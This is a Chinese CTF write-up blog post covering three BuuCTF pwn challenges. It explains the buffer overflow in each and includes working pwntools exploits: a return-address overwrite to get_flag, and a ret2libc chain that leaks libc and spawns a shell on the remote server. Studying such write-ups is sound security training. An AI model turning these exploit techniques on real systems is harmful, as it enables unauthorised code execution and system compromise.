---
title: 「BuuCTF」Part I
date: 2020-07-17 09:07:05
cover: https://img.buuoj.cn/buugirl/img.php
tags: 
	- CTF
	- PWN
---

*Buu上的题目很多，遇到些感觉需要记录一下的题目就写在这里。*  如有错误还请路过的师傅在评论区指出。

# pwn1_sctf_2016

*这道题没什么难的，主要记录几个C++的标准库函数。*

![](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BuuCTF1/pwn1_sctf_2016/%E6%88%AA%E5%B1%8F2020-07-17%20%E4%B8%8A%E5%8D%889.22.26.png)

一大堆看起来乱七八糟的函数。这些函数的简单介绍：

```text
fgets
函数原型：char * fgets ( char * str, int num, FILE * stream );
函数功能：
从流中读取字符，并将它们作为C字符串存储到str中，直到已读取（num-1）个字符或到达换行符或到达文件末尾（以先发生的为准）。
换行符使fgets停止读取，但是该函数将其视为有效字符并包含在复制到str的字符串中。
复制到str的字符后会自动附加一个终止的空字符。
请注意，fgets与gets完全不同：fgets不仅接受流参数，而且还允许指定str的最大大小，并在字符串中包括任何结尾的换行符。

std:replace
函数原型：
template <class ForwardIterator, class T>
  void replace (ForwardIterator first, ForwardIterator last,
                const T& old_value, const T& new_value);
函数功能：
替换范围内的值
将new_value分配给[first，last)范围内所有等于old_value的元素。
该函数使用"operator ==" 将各个元素与old_value进行比较。
该功能模板的行为等效于：
template <class ForwardIterator, class T>
  void replace (ForwardIterator first, ForwardIterator last,
                const T& old_value, const T& new_value)
{
  while (first!=last) {
    if (*first == old_value) *first=new_value;
    ++first;
  }
}
参数再介绍：
first, last：将迭代器转发到元素序列中的初始位置和最终位置，这些元素支持比较并分配为T类型的值。
            使用的范围是[first，last），其中包含first和last之间的所有元素，包括由指向的元素 首先但不是最后指出的元素。
old_value：要替换的值。
new_value：新的值

可以暂时粗略地地这样记下： replace (first,last,old_value,new_value);

std::string::operator=(&input, &s);
作用： 就是 将s指针赋值到 inputs地址里了。 


strcpy:
函数原型：char * strcpy ( char * destination, const char * source );
函数功能：  
将source指向的C字符串复制到destination指向的数组中，包括终止的空字符（并在该位置停止）。
为避免溢出，目标指向的数组的大小应足够长，以包含与源相同的C字符串（包括终止空字符），并且在内存中不应与源重叠。

```

文本来源：[紫色仰望合天智汇](https://zhuanlan.zhihu.com/p/138897356)

但是经过简单测试我们就能发现所有的‘I’都会被替换成‘you’。s2原本不会溢出，经过替换再赋值给s2就可以造成溢出。

![](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BuuCTF1/pwn1_sctf_2016/stack.jpg)

可以看到从s2到返回地址中间还有很多个变量。想要覆盖到返回地址一共需要覆盖64个字节，那么就可以20个I+4个字符来实现溢出，再加上get_flag函数地址即可。总共是28个字节小于32，是可行的。

exp：

```python
from pwn import*
#context.log_level='debug'
res=remote('node3.buuoj.cn',28767)
get_flag=0x08048F0D
payload='I'*20+'N0P3'+p32(get_flag)
res.sendline(payload)
res.interactive()
```

# ciscn_2019_c_1

这道题就是普通ret2libc，踩了个ubuntu18栈对齐的坑，写下exp以备参考

```python
from pwn import*
from LibcSearcher import*
elf=ELF('./ciscn_2019_c_1')
#context.log_level='debug'
res=remote('node3.buuoj.cn',29379)
res.recv()
res.sendline('1')
res.recv()
ret=0x4006b9
pop_rdi=0x400c83
pop_rsi_r15=0x4008a3
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
start=elf.symbols['_start']
payload='A'*0x50+'a'*4+'N0P3'+p64(ret)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(start)
res.sendline(payload)
puts_got=res.recv()
#print(puts_got)
puts_got=puts_got[6*16+7:6*16+8+5]
#print(puts_got)
puts_got=u64(puts_got.ljust(8,'\x00'))
print(puts_got)
if puts_got==0x0:
    print('Attack failed. Please try again.')
else:
    Searcher=LibcSearcher('puts',puts_got)
    offset=puts_got-Searcher.dump('puts')
    res.sendline('1')
    res.recv()
    binsh=Searcher.dump('str_bin_sh')+offset
    system=Searcher.dump('system')+offset
    payload='A'*0x50+'a'*4+'N0P3'+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)
    res.sendline(payload)
    res.recv()
    res.interactive()
```

payload里需要执行一次ret来使栈对齐。第一个payload会有时会失效，大概每执行3次exp就有一次泄漏失败。原因未知，可能与服务器环境有关。

# [OGeek2019]babyrop

**普通的ret2libc，中间有一个小的绕过姿势。*

![main](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BuuCTF1/%5BOGeek2019%5Dbabyrop/Main.png)

在主函数使用urandom生成了一个随机数，接着调用了HanShu1。

![HanShu1](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BuuCTF1/%5BOGeek2019%5Dbabyrop/HanShu1.png)

Line 11把a1格式化后放入了s，bufa是我们输入的字符串，在Line 15两者不相等则直接退出。比较的长度v1是可控的，strlen遇到\x00会截断，所以payload开头放个\x00就可以使比对长度为0，这样就能绕过对比。

这个函数在line 12还有个溢出点能覆盖v5，v5是下一个函数的参数。

![截屏2020-07-18 下午5.16.35](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/BuuCTF1/%5BOGeek2019%5Dbabyrop/Sub.png)

a1就是上个函数的v5，127是0x7f，只要不等于0x7f我们覆盖的值就可以作为read的长度参数了。但是经过测试0xC8也是能在远程打通的，看来服务器运行的程序和这个有点出入。

exp:

```python
#这是后来补的wp，exp手滑覆盖掉了==
```

